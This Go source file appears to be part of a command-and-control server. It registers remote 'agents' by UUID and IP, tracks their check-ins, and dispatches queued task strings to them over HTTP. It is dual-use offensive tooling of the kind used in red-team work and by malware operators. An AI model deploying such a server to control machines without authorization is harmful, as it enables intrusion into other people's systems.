package includes

import (
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"net"
	"net/http"
	"strings"
	"time"
)

func GenerateUUID() string {
	return uuid.New().String()
}

func first_checkin(w http.ResponseWriter, r *http.Request) *Agent {
	ID := GenerateUUID()
	response := map[string]string{
		"agent_id": ID,
	}

	agent := &Agent{
		ID:       ID,
		Hostname: "",
		OS:       "",
		IP:       net.ParseIP(strings.Split(r.RemoteAddr, ":")[0]),
		LastSeen: time.Now(),
		Tasks:    []string{},
	}

	Manager.AddAgent(agent)

	json.NewEncoder(w).Encode(response)

	fmt.Printf("[+] New Agent Registered:\n\tIP: %s\n\tID: %s\n", r.RemoteAddr, agent.ID)

	return agent
}

func agent_checkin(w http.ResponseWriter, r *http.Request) {
	agent_id := r.URL.Path[len("/checkin/"):]
	if len(agent_id) == 0 {
		http.Error(w, "Agent ID not provided", http.StatusBadRequest)
		return
	}

	// Modify agents Last Check in Time
	agent, exists := Manager.GetAgent(agent_id)
	if !exists {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}
	agent.LastSeen = time.Now()

	// Process agent tasking
	task, exists := Manager.GetNextTaskForAgent(agent_id)

	if !exists {

	} else {
		fmt.Printf("[+] Task sent to Agent %s: %v\n", agent_id, task)
	}

	response := map[string]string{
		"id":   agent_id,
		"task": task,
	}
	json.NewEncoder(w).Encode(response)

}
